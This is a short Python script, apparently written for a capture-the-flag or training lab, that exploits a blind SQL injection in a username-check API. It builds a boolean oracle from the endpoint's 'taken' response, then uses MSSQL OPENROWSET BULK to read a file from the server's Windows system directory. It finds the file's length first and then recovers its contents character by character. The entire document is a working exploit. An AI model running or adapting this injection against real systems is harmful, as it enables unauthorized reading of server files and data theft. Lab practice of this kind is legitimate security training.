#!/usr/bin/python3

import requests
import json
import sys
from urllib.parse import quote_plus

# The user we are targeting
target = "maria"
ip = "10.129.204.197"
# Checks if query `q` evaluates as `true` or `false`
def oracle(q):
    p = quote_plus(f"{target}' AND ({q})-- -")
    r = requests.get(
        f"http://{ip}/api/check-username.php?u={p}"
    )
    j = json.loads(r.text)
    return j['status'] == 'taken'

# Get files
file_path = 'C:\\Windows\\System32\\flag.txt' # Target file

length = 0
while True:
    query = f"(select LEN(BulkColumn) FROM OPENROWSET(Bulk '{file_path}', SINGLE_CLOB) As x) = {length}"
    status = oracle(query)
    if status:
        break
    else:
        length += 1
print(length)

flag = ""
for l in range(1, length + 1):
    for c in range(32,127):
        query = f"(SELECT ASCII(SUBSTRING(BulkColumn,{l},1))FROM OPENROWSET(Bulk '{file_path}', SINGLE_CLOB) As x) = {c}"
        status = oracle(query)
        if status:
            flag += chr(c)
            break
print(flag)